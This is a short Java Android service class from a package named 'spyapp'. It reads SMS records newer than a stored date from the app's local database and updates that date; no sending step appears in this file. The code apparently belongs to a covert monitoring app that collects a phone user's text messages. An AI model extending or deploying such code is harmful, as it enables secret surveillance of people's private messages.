package com.app.spyapp.servercall;

import android.app.IntentService;
import android.content.Intent;
import android.util.Log;

import com.app.spyapp.SpyApp;
import com.app.spyapp.common.Const;
import com.app.spyapp.common.Pref;
import com.app.spyapp.model.SMSModel;

import java.util.ArrayList;

public class SMSCallService extends IntentService {

    private SpyApp spyApp;

    public SMSCallService() {
        super(SMSCallService.class.getSimpleName());
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        spyApp = (SpyApp) getApplicationContext();
        ArrayList<SMSModel> smsList = spyApp.getDatabaseHelper().getSMSList(spyApp.getSharedPreferences().getString(Pref.SMS_LAST_UPDATEDATE, Const.INITDATETIME));
        spyApp.getSharedPreferences().edit().putString(Pref.SMS_LAST_UPDATEDATE, spyApp.getDatabaseHelper().getMaxDateofSMS()).apply();
        Log.i("Debug", "onHandleIntent: SMSCallService");
    }
}
